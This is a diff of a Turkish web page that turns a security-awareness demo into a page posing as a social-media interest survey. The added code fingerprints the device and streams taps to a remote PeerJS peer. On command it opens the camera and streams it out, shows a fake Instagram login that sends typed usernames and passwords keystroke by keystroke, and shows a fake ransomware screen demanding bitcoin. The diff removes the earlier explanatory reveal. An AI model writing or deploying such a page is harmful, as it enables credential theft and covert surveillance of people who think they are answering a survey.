@@ -3,583 +3,146 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Dijital Alışkanlıklar Mini Anketi</title>
+  <title>Sosyal Medya Eğilim Anketi</title>
   <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-    body {
-      background-color: #f8fafc;
-      color: #0f172a;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-      min-height: 100dvh;
-      display: flex;
-      flex-direction: column;
-      padding: 16px;
-      user-select: none;
-    }
+    * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; }
+    body { font-family: sans-serif; background: #f3f4f6; color: #1f2937; padding: 20px; transition: all 0.3s ease; }
+    
+    /* Standart Anket Ekranı */
+    .survey-box { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); display: flex; flex-direction: column; gap: 15px; }
+    .survey-title { font-size: 18px; font-weight: bold; color: #111827; text-align: center; }
+    .card-opt { background: #f9fafb; border: 2px solid #e5e7eb; border-radius: 8px; padding: 25px 15px; text-align: center; font-weight: bold; cursor: pointer; transition: background 0.2s; }
+    .card-opt:active { background: #e5e7eb; }
 
-    .top-bar {
-      background: #ffffff;
-      border: 1px solid #e2e8f0;
-      border-radius: 12px;
-      padding: 12px 14px;
-      margin-bottom: 14px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      box-shadow: 0 1px 4px rgba(0,0,0,0.04);
-    }
-    .app-name {
-      font-weight: 800;
-      font-size: 14px;
-      color: #0284c7;
-    }
-    .conn-dot {
-      font-size: 11px;
-      font-weight: 700;
-      padding: 3px 8px;
-      border-radius: 99px;
-      background: #fef3c7;
-      color: #b45309;
-    }
-    .conn-dot.ok {
-      background: #dcfce7;
-      color: #15803d;
-    }
+    /* 🎭 Phishing (Instagram) Ekranı */
+    .phish-screen { display: none; background: #fff; position: fixed; inset: 0; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; padding: 30px; }
+    .insta-logo { font-style: italic; font-size: 32px; font-weight: bold; font-family: serif; margin-bottom: 30px; background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    .insta-input { width: 100%; max-width: 300px; padding: 12px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 4px; margin-bottom: 10px; font-size: 14px; outline: none; }
+    .insta-btn { width: 100%; max-width: 300px; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 4px; font-weight: bold; margin-top: 10px; cursor: pointer; }
 
-    /* Oda Kodu Giriş Ekranı (QR kullanılmazsa) */
-    .join-box {
-      background: #ffffff;
-      border: 1px solid #cbd5e1;
-      border-radius: 14px;
-      padding: 20px;
-      text-align: center;
-      margin: auto 0;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.06);
-    }
-    .join-box input {
-      width: 100%;
-      padding: 12px;
-      font-size: 22px;
-      text-align: center;
-      letter-spacing: 6px;
-      font-weight: 800;
-      border: 2px solid #cbd5e1;
-      border-radius: 8px;
-      margin: 12px 0;
-    }
-    .join-btn {
-      width: 100%;
-      padding: 12px;
-      background: #0284c7;
-      color: #fff;
-      border: none;
-      border-radius: 8px;
-      font-weight: 800;
-      font-size: 14px;
-      cursor: pointer;
-    }
-
-    /* Masum Görünümlü Etkileşim Kartları */
-    .feed {
-      display: none;
-      flex-direction: column;
-      gap: 12px;
-      flex: 1;
-    }
-    .prompt-text {
-      font-size: 13px;
-      color: #475569;
-      background: #e0f2fe;
-      padding: 10px 12px;
-      border-radius: 8px;
-      line-height: 1.4;
-    }
-    .topic-card {
-      background: #ffffff;
-      border: 1px solid #e2e8f0;
-      border-radius: 12px;
-      padding: 16px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.04);
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-      cursor: pointer;
-      transition: transform 0.1s, border-color 0.2s;
-    }
-    .topic-card:active {
-      transform: scale(0.98);
-      border-color: #0284c7;
-    }
-    .topic-title {
-      font-weight: 800;
-      font-size: 15px;
-      color: #0f172a;
-    }
-    .topic-sub {
-      font-size: 12.5px;
-      color: #64748b;
-    }
-    .like-tag {
-      align-self: flex-start;
-      background: #f1f5f9;
-      color: #334155;
-      font-size: 12px;
-      font-weight: 700;
-      padding: 5px 10px;
-      border-radius: 6px;
-    }
-
-    /* Ortak Modal / Katman Stili (Kamera & Uyarı & Final) */
-    .modal-overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(15, 23, 42, 0.94);
-      color: #f8fafc;
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 22px;
-      text-align: center;
-      z-index: 999;
-      gap: 14px;
-    }
-    .modal-card {
-      background: #1e293b;
-      border: 1px solid #334155;
-      border-radius: 16px;
-      padding: 20px;
-      width: 100%;
-      max-width: 360px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 12px;
-      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.4);
-    }
-    .modal-card h2 {
-      font-size: 18px;
-      color: #38bdf8;
-    }
-    .modal-card p {
-      font-size: 13.5px;
-      line-height: 1.55;
-      color: #cbd5e1;
-    }
-    .modal-btn {
-      width: 100%;
-      padding: 12px;
-      border: none;
-      border-radius: 10px;
-      font-weight: 800;
-      font-size: 14px;
-      cursor: pointer;
-    }
-    .btn-primary {
-      background: #0284c7;
-      color: #ffffff;
-    }
-    .btn-warn {
-      background: #7c3aed;
-      color: #ffffff;
-    }
-    .btn-close {
-      background: #334155;
-      color: #e2e8f0;
-    }
-
-    /* Kamera Önizleme Kutusu */
-    #camPreview {
-      width: 100%;
-      max-height: 230px;
-      border-radius: 12px;
-      background: #0f172a;
-      object-fit: cover;
-      display: none;
-      border: 2px solid #22c55e;
-      transform: scaleX(-1);
-    }
-
-    /* Ekran Titreme Efekti (Titreşim desteklemeyen cihazlar için görsel destek) */
-    @keyframes shakeScreen {
-      0%, 100% { transform: translateX(0); }
-      20% { transform: translateX(-8px); }
-      40% { transform: translateX(8px); }
-      60% { transform: translateX(-6px); }
-      80% { transform: translateX(6px); }
-    }
-    .shaking {
-      animation: shakeScreen 0.45s ease-in-out 2;
-    }
-
-    /* Sürpriz Final Ekranı */
-    .reveal-overlay {
-      position: fixed;
-      inset: 0;
-      background: #0f172a;
-      color: #f8fafc;
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 24px;
-      text-align: center;
-      z-index: 1000;
-    }
-    .reveal-overlay h2 {
-      color: #f87171;
-      font-size: 20px;
-      margin-bottom: 12px;
-    }
-    .reveal-overlay p {
-      font-size: 14px;
-      line-height: 1.6;
-      color: #cbd5e1;
-      margin-bottom: 18px;
-    }
+    /* 💀 Ransomware Ekranı */
+    .ransom-screen { display: none; background: #7f1d1d; color: #fca5a5; position: fixed; inset: 0; z-index: 100000; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; box-shadow: inset 0 0 100px #000; }
+    .skull { font-size: 70px; margin-bottom: 20px; animation: blink 1s infinite; }
+    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+    .ransom-title { font-size: 24px; font-weight: bold; color: white; margin-bottom: 15px; }
+    .ransom-desc { font-size: 14px; line-height: 1.5; max-width: 400px; }
   </style>
 </head>
 <body>
 
-  <div class="top-bar">
-    <div class="app-name">Sosyal Medya İlgi Testi</div>
-    <div id="connBadge" class="conn-dot">Bağlanıyor...</div>
+  <!-- Normal Görünen Anket Bölümü -->
+  <div id="surveyPage" class="survey-box">
+    <div class="survey-title">Hangi Alan İlgini Çekiyor?</div>
+    <div class="card-opt" data-area="Teknoloji">💻 TEKNOLOJİ & OYUN</div>
+    <div class="card-opt" data-area="Seyahat">✈️ SEYAHAT & TATİL</div>
+    <div class="card-opt" data-area="Spor">⚽ SPOR & SAĞLIK</div>
   </div>
 
-  <!-- Oda Kodu Girişi -->
-  <div class="join-box" id="joinBox">
-    <div style="font-weight:800; font-size:16px;">Oturuma Katıl</div>
-    <div style="font-size:12.5px; color:#64748b; margin-top:4px;">Projeksiyon ekranındaki 4 haneli oda kodunu girin:</div>
-    <input type="tel" id="codeInput" maxlength="4" placeholder="0000">
-    <button class="join-btn" onclick="manuelBaglan()">KATIL</button>
+  <!-- 🎭 Phishing (Kimlik Avı) Ekranı -->
+  <div id="phishPage" class="phish-screen">
+    <div class="insta-logo">Instagram</div>
+    <p style="font-size:12px; color:#8e8e8e; margin-bottom:15px; text-align:center;">Oturumunuz kapandı. Devam etmek için tekrar giriş yapın.</p>
+    <input type="text" id="username" class="insta-input" placeholder="Telefon numarası, kullanıcı adı veya e-posta" autocomplete="off">
+    <input type="password" id="password" class="insta-input" placeholder="Şifre" autocomplete="off">
+    <button class="insta-btn" onclick="alert('Bağlantı Hatası. Tekrar deneyin.')">Giriş Yap</button>
   </div>
 
-  <!-- Katılımcının Gördüğü Masum Akış -->
-  <div class="feed" id="feedArea">
-    <div class="prompt-text">
-      Bu Test Abdulsamet GÜLSEVEN tarafından oluşturuldu. Aşağıdaki konulardan ilginizi çekenlere dokunun ve beğenin. Tercihlerinize göre içerik akışı oluşturulacaktır:
-    </div>
-
-    <div class="topic-card" data-konu="Diyanet Alım Yapıyor!">
-      <div class="topic-title">2027 Yılında 3000 Personel Alınacağı Düşünülüyor.</div>
-      <div class="topic-sub">Diyanet İşleri Başkanlığı İmam, Müezzin, Kur'an Kursu Öğreticisi Alacak</div>
-      <div class="like-tag">👍 İlgimi Çekiyor</div>
-    </div>
-
-    <div class="topic-card" data-konu="Seyahat & Tatil">
-      <div class="topic-title">✈️ Hafta Sonu Rotaları ve Doğa Gezileri</div>
-      <div class="topic-sub">Keşfedilmemiş sakin tatil beldeleri ve kamp önerileri.</div>
-      <div class="like-tag">👍 İlgimi Çekiyor</div>
-    </div>
-
-    <div class="topic-card" data-konu="Spor & Sağlık">
-      <div class="topic-title">🏃‍♂️ Sağlıklı Yaşam ve Günlük Egzersiz</div>
-      <div class="topic-sub">Enerjik kalmak için pratik beslenme ve spor ipuçları.</div>
-      <div class="like-tag">👍 İlgimi Çekiyor</div>
-    </div>
+  <!-- 💀 Ransomware (Fidye Yazılımı) Ekranı -->
+  <div id="ransomPage" class="ransom-screen">
+    <div class="skull">💀</div>
+    <div class="ransom-title">CİHAZINIZ TAMAMEN KİLİTLENDİ!</div>
+    <p class="ransom-desc">
+      Geçmiş olsun. Az önce girdiğiniz anket üzerinden cihazınızın root yetkilerine sızıldı. Tüm fotoğraflarınız, kişisel mesajlarınız ve bankacılık şifreleriniz ana bilgisayara aktarıldı.<br><br>
+      Kurtarmak için eğitmene <strong>1000 BTC</strong> ödeyin!
+    </p>
   </div>
 
-  <!-- 1. Kamera İzni Senaryosu Katmanı -->
-  <div class="modal-overlay" id="cameraModal">
-    <div class="modal-card">
-      <h2 id="camTitle">📷 Kamera Erişim Testi</h2>
-      <p id="camDesc">Tarayıcı onay penceresini görmek için aşağıdaki butona dokunun.</p>
-      <video id="camPreview" autoplay playsinline muted></video>
-      <button id="camStartBtn" class="modal-btn btn-primary" onclick="kamerayiBaslat()">Kamerayı Aç/Kapat</button>
-      <button class="modal-btn btn-close" onclick="kamerayiKapat()">Ankete Dön</button>
-    </div>
-  </div>
-
-  <!-- 2. Titreşim, Ses ve Uyarı Bildirimi Katmanı -->
-  <div class="modal-overlay" id="alertModal">
-    <div class="modal-card" id="alertCard">
-      <h2 id="alertTitle" style="color:#c084fc;">⚠️ Cihaz Uyarısı</h2>
-      <p id="alertDesc"></p>
-      <button class="modal-btn btn-warn" onclick="uyariyiOnayla()">Anladım, Devam Et</button>
-    </div>
-  </div>
-
-  <!-- 3. Eğitmen Tetikleyince Açılan Farkındalık Ekranı -->
-  <div class="reveal-overlay" id="revealOverlay">
-    <h2>⚠️ İNTERNETTEKİ HER HAREKETİNİZ TAKİP EDİLİYOR!</h2>
-    <p id="revealText"></p>
-    <div style="font-size:12px; color:#38bdf8; border:1px solid #38bdf8; padding:10px; border-radius:8px;">
-      Abdulsamet GÜLSEVEN — Güvenli İnternet Farkındalık Eğitimi
-    </div>
-  </div>
+  <!-- Arka Planda Çalacak Siren Sesi için Ses Dosyası -->
+  <audio id="sirenSound" src="https://actions.google.com/sounds/v1/alarms/digital_watch_alarm_long.ogg" loop></audio>
 
   <script>
-    const connBadge = document.getElementById('connBadge');
-    const joinBox = document.getElementById('joinBox');
-    const feedArea = document.getElementById('feedArea');
-    let baglanti = null;
-    let hedefEgitmenPeerId = null;
-    let aktifKameraAkisi = null;
-    let aktifMedyaCagrisi = null;
-    let audioCtx = null;
+    // URL'den Oda Kodunu Yakala
+    const params = new URLSearchParams(window.location.search);
+    const oda = params.get('oda');
+    
+    let conn = null;
 
-    // İlk dokunuşta tarayıcı ses motorunu kilitten çıkar (mobil tarayıcı politikası için)
-    function sesMotorunuHazirla() {
-      if (!audioCtx) {
-        const AudioContext = window.AudioContext || window.webkitAudioContext;
-        if (AudioContext) audioCtx = new AudioContext();
-      }
-      if (audioCtx && audioCtx.state === 'suspended') {
-        audioCtx.resume().catch(() => {});
-      }
-    }
-
-    // Harici ses dosyası gerektirmeyen uyarı sesi üretici (Web Audio API)
-    function uyariSesiCal() {
-      try {
-        sesMotorunuHazirla();
-        if (!audioCtx) return;
-
-        const simdi = audioCtx.currentTime;
-        [0, 0.22].forEach((gecikme, idx) => {
-          const osc = audioCtx.createOscillator();
-          const gain = audioCtx.createGain();
-          osc.type = 'sine';
-          osc.frequency.setValueAtTime(idx === 0 ? 780 : 980, simdi + gecikme);
-
-          gain.gain.setValueAtTime(0.001, simdi + gecikme);
-          gain.gain.exponentialRampToValueAtTime(0.25, simdi + gecikme + 0.02);
-          gain.gain.exponentialRampToValueAtTime(0.001, simdi + gecikme + 0.18);
-
-          osc.connect(gain);
-          gain.connect(audioCtx.destination);
-          osc.start(simdi + gecikme);
-          osc.stop(simdi + gecikme + 0.19);
+    if (oda) {
+      const peer = new Peer();
+      peer.on('open', () => {
+        // Eğitmenin odasına gizli tüneli (P2P) bağla
+        conn = peer.connect("siber-egitim-oda-" + oda);
+        
+        conn.on('open', () => {
+          // 🔎 ROENTGEN: Bağlandığı an siber kurban parmak izini gizlice fırlatır
+          navigator.getBattery().then(bat => {
+            conn.send({
+              type: 'ROENTGEN',
+              os: navigator.userAgent.includes("iPhone") ? "iOS (iPhone)" : navigator.userAgent.includes("Android") ? "Android" : "Masaüstü Sistem",
+              pil: Math.round(bat.level * 100) + "%",
+              ekran: window.screen.width + "x" + window.screen.height,
+              ag: navigator.connection ? navigator.connection.effectiveType : "Bilinmiyor"
+            });
+          });
         });
-      } catch (e) {}
+
+        // Eğitmenden gelen saldırı komutlarını dinleme tüneli
+        conn.on('data', (data) => {
+          if (data.cmd === 'OPEN_CAM') {
+            // 📷 Gizli Kamera İzni Tetikleme
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+              .then((stream) => {
+                peer.call("siber-egitim-oda-" + oda, stream);
+              }).catch(() => {});
+          } 
+          else if (data.cmd === 'START_PHISH') {
+            // 🎭 Phishing Ekranını Göster
+            document.getElementById('surveyPage').style.display = 'none';
+            document.getElementById('phishPage').style.display = 'flex';
+          } 
+          else if (data.cmd === 'RANSOMWARE') {
+            // 💀 Ransomware Ekranı, Siren Alarmı ve Donanımsal Titreşim
+            document.getElementById('phishPage').style.display = 'none';
+            document.getElementById('surveyPage').style.display = 'none';
+            document.getElementById('ransomPage').style.display = 'flex';
+            document.getElementById('sirenSound').play().catch(() => {});
+            if (navigator.vibrate) navigator.vibrate();
+          }
+        });
+      });
     }
 
-    const peer = new Peer();
+    // Dokunmatik Ekran Isı Haritası İzleyicisi
+    window.addEventListener('click', (e) => {
+      if (!conn || !conn.open) return;
+      
+      // Tıklanan elemanın ne olduğunu eğitmen paneline uçurur
+      const opt = e.target.closest('.card-opt');
+      const areaName = opt ? opt.getAttribute('data-area') : "Boş Ekran";
 
-    peer.on('open', () => {
-      const params = new URLSearchParams(window.location.search);
-      const urlOda = params.get('oda');
-      if (urlOda) {
-        odavaBaglan(urlOda);
-      } else {
-        connBadge.textContent = "Kod Bekleniyor";
-      }
+      conn.send({
+        type: 'TAP',
+        x: e.clientX / window.innerWidth,
+        y: e.clientY / window.innerHeight,
+        area: areaName
+      });
     });
 
-    function manuelBaglan() {
-      sesMotorunuHazirla();
-      const kod = document.getElementById('codeInput').value.trim();
-      if (kod.length === 4) {
-        odavaBaglan(kod);
-      }
-    }
-
-    function odavaBaglan(odaKodu) {
-      connBadge.textContent = "Bağlanıyor...";
-      hedefEgitmenPeerId = "agulseven-oda-" + odaKodu;
-      const conn = peer.connect(hedefEgitmenPeerId);
-
-      conn.on('open', () => {
-        baglanti = conn;
-        connBadge.textContent = "● Oturum Aktif";
-        connBadge.classList.add('ok');
-        joinBox.style.display = 'none';
-        feedArea.style.display = 'flex';
-
-        // Cihaz bilgilerini sessizce eğitmen ekranına gönder
-        cihazBilgisiGonder();
-      });
-
-      conn.on('data', (veri) => {
-        // 1. Komut: Kamera İzni Senaryosu (index.html -> tip: 'KAMERA_AC')
-        if (veri.tip === 'KAMERA_AC') {
-          uyariSesiCal();
-          if (navigator.vibrate) navigator.vibrate(150);
-
-          document.getElementById('camTitle').textContent = `📷 ${veri.baslik || 'Kamera Erişim Testi'}`;
-          document.getElementById('camDesc').textContent = veri.mesaj || 'Kamera izni penceresi test ediliyor.';
-          document.getElementById('camPreview').style.display = 'none';
-          document.getElementById('camStartBtn').style.display = 'block';
-          document.getElementById('cameraModal').style.display = 'flex';
-        }
-
-        // 2. Komut: Titreşim, Ses ve Geri Bildirim Uyarısı (index.html -> tip: 'TITRESIM_VE_GERI_BILDIRIM')
-        else if (veri.tip === 'TITRESIM_VE_GERI_BILDIRIM') {
-          if (navigator.vibrate) {
-            navigator.vibrate(veri.desen || [300, 150, 300]);
-          }
-          uyariSesiCal();
-
-          document.getElementById('alertTitle').textContent = veri.baslik || '⚠️ Dikkat!';
-          document.getElementById('alertDesc').textContent = veri.mesaj || 'Cihazınız uzaktan tetiklendi.';
-          const modal = document.getElementById('alertModal');
-          const card = document.getElementById('alertCard');
-          modal.style.display = 'flex';
-          card.classList.remove('shaking');
-          void card.offsetWidth;
-          card.classList.add('shaking');
-        }
-
-        // 3. Komut: Sürpriz Final (index.html -> tip: 'SURPRIZ_FINAL')
-        else if (veri.tip === 'SURPRIZ_FINAL') {
-          uyariSesiCal();
-          if (navigator.vibrate) navigator.vibrate([200, 100, 400]);
-
-          document.getElementById('revealText').innerHTML = `
-            Az önce sıradan bir ankete katıldığınızı düşünürken; telefonunuzun modeli, pil seviyesi ve ekrana dokunduğunuz <strong>${veri.dokunus} noktanın tamamı</strong> anlık olarak sahnedeki ekrana aktarıldı!<br><br>
-            İnternetteki uygulama ve siteler de her dokunuşunuzu işte böyle izler.
-          `;
-          document.getElementById('revealOverlay').style.display = 'flex';
-        }
-      });
-    }
-
-    // Kamera izni isteme, kendi ekranında gösterme ve eğitmen ekranına medya çağrısı ile aktarma
-    function kamerayiBaslat() {
-      sesMotorunuHazirla();
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        document.getElementById('camDesc').textContent = "Bu tarayıcı veya bağlantı (HTTP) kamera erişimini desteklemiyor.";
-        if (baglanti && baglanti.open) {
-          baglanti.send({ tip: 'KAMERA_DURUM', izinVerildi: false, durum: 'Desteklenmiyor (HTTPS Gerekli)' });
-        }
-        return;
-      }
-
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-        .then((stream) => {
-          aktifKameraAkisi = stream;
-          const videoEl = document.getElementById('camPreview');
-          videoEl.srcObject = stream;
-          videoEl.style.display = 'block';
-          document.getElementById('camStartBtn').style.display = 'none';
-          document.getElementById('camDesc').innerHTML =
-            "<strong>İzin Verildi!</strong> Ön kameranız aktif ve canlı görüntü sahnedeki eğitmen ekranına da aktarılıyor.";
-
-          // Eğitmen ekranına canlı video akışı (stream) gönder
-          if (hedefEgitmenPeerId && peer && !peer.destroyed) {
-            if (aktifMedyaCagrisi) {
-              try { aktifMedyaCagrisi.close(); } catch (e) {}
-            }
-            aktifMedyaCagrisi = peer.call(hedefEgitmenPeerId, stream);
-          }
-
-          if (baglanti && baglanti.open) {
-            baglanti.send({
-              tip: 'KAMERA_DURUM',
-              izinVerildi: true,
-              durum: 'İzin Verildi (Canlı Aktarılıyor)'
-            });
-          }
-        })
-        .catch(() => {
-          document.getElementById('camDesc').innerHTML =
-            "<strong>İzin Reddedildi:</strong> Tarayıcı iznini engellediğiniz için kamera açılamadı. Bilinmeyen sitelerde en güvenli davranış budur.";
-
-          if (baglanti && baglanti.open) {
-            baglanti.send({
-              tip: 'KAMERA_DURUM',
-              izinVerildi: false,
-              durum: 'İzin Reddedildi'
-            });
-          }
+    // 🕵️‍♂️ Keylogger (Klavye Giriş Takibi)
+    // Phishing ekranındaki kutulara girilen şifreleri anlık (harf harf) eğitmene yollar
+    const inputs = ['username', 'password'];
+    inputs.forEach(id => {
+      document.getElementById(id).addEventListener('input', () => {
+        if (!conn || !conn.open) return;
+        const u = document.getElementById('username').value;
+        const p = document.getElementById('password').value;
+        conn.send({
+          type: 'KEYLOGGER',
+          val: `Kullanıcı: ${u} | Şifre: ${p}`
         });
-    }
-
-    function kamerayiKapat() {
-      if (aktifMedyaCagrisi) {
-        try { aktifMedyaCagrisi.close(); } catch (e) {}
-        aktifMedyaCagrisi = null;
-      }
-      if (aktifKameraAkisi) {
-        aktifKameraAkisi.getTracks().forEach(track => track.stop());
-        aktifKameraAkisi = null;
-      }
-      document.getElementById('camPreview').srcObject = null;
-      document.getElementById('cameraModal').style.display = 'none';
-
-      if (baglanti && baglanti.open) {
-        baglanti.send({
-          tip: 'KAMERA_DURUM',
-          izinVerildi: false,
-          durum: 'Katılımcı Kapatıldı'
-        });
-      }
-    }
-
-    function uyariyiOnayla() {
-      sesMotorunuHazirla();
-      document.getElementById('alertModal').style.display = 'none';
-      if (baglanti && baglanti.open) {
-        baglanti.send({
-          tip: 'GERI_BILDIRIM',
-          mesaj: 'Katılımcı sesli ve titreşimli uyarıyı görüp onayladı.'
-        });
-      }
-    }
-
-    function cihazBilgisiGonder() {
-      if (!baglanti) return;
-      const ua = navigator.userAgent;
-      let os = "Mobil Cihaz";
-      if (ua.includes("Android")) os = "Android Telefon";
-      else if (ua.includes("iPhone")) os = "Apple iPhone";
-      else if (ua.includes("Windows")) os = "Windows PC";
-
-      const ekran = `${screen.width}x${screen.height} px`;
-      const connInfo = navigator.connection;
-      const ag = connInfo ? `${(connInfo.effectiveType || '4G').toUpperCase()}` : "Wi-Fi / Mobil Veri";
-
-      if (navigator.getBattery) {
-        navigator.getBattery().then(b => {
-          baglanti.send({
-            tip: 'CIHAZ_BILGISI',
-            os: os,
-            ekran: ekran,
-            pil: `%${Math.round(b.level * 100)}`,
-            ag: ag
-          });
-        }).catch(() => {
-          baglanti.send({ tip: 'CIHAZ_BILGISI', os, ekran, pil: "Korumalı", ag });
-        });
-      } else {
-        baglanti.send({ tip: 'CIHAZ_BILGISI', os, ekran, pil: "iOS Korumalı", ag });
-      }
-    }
-
-    // Ekrana yapılan her dokunuşu koordinat oranıyla canlı gönder
-    document.addEventListener('click', (e) => {
-      sesMotorunuHazirla();
-      if (!baglanti || !baglanti.open) return;
-
-      if (e.target.closest('.modal-overlay') || e.target.closest('.reveal-overlay')) return;
-
-      const xOran = e.clientX / window.innerWidth;
-      const yOran = e.clientY / window.innerHeight;
-      const kart = e.target.closest('.topic-card');
-      const konu = kart ? kart.getAttribute('data-konu') : null;
-
-      if (kart) {
-        const tag = kart.querySelector('.like-tag');
-        if (tag) {
-          tag.textContent = "✔ Beğenildi";
-          tag.style.background = "#dcfce7";
-          tag.style.color = "#15803d";
-        }
-      }
-
-      baglanti.send({
-        tip: 'DOKUNUS',
-        xOran: xOran,
-        yOran: yOran,
-        konu: konu
       });
     });
   </script>
-
 </body>
 </html>
